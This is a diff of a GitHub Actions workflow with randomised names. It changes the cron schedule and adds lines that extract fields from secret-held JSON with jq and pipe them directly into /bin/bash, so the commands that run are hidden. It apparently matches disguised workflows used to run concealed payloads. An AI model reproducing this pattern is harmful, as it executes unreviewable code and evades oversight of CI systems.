@@ -1,9 +1,8 @@
 name: wangniman6758
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 1/6 * * *'
+    - cron: '33 3/6 * * *'
 
 jobs:
   build:
@@ -13,9 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: wangniman6758
         env:
-          yqrik47258: ${{ secrets.yqrik47258 }}
+          vzi43246: ${{ secrets.vzi43246 }}
         run: |
-          echo $yqrik47258 | jq -r .yzmc9 | /bin/bash
-          echo $cpie8 | jq -r .uwv1 | /bin/bash
-          echo $kfa16344 | jq -r .obma76337 | /bin/bash
+          echo $vzi43246 | jq -r .px19 | /bin/bash
+          echo $nn35 | jq -r .tgbqw0 | /bin/bash
+          echo $xop96256 | jq -r .sf10936 | /bin/bash
+          echo $sc612 | jq -r .zhyok43864 | /bin/bash
+          echo $wis02 | jq -r .ii041 | /bin/bash
+          echo $sxkr196 | jq -r .gc80 | /bin/bash
+          echo $e57 | jq -r .ggc779 | /bin/bash
 
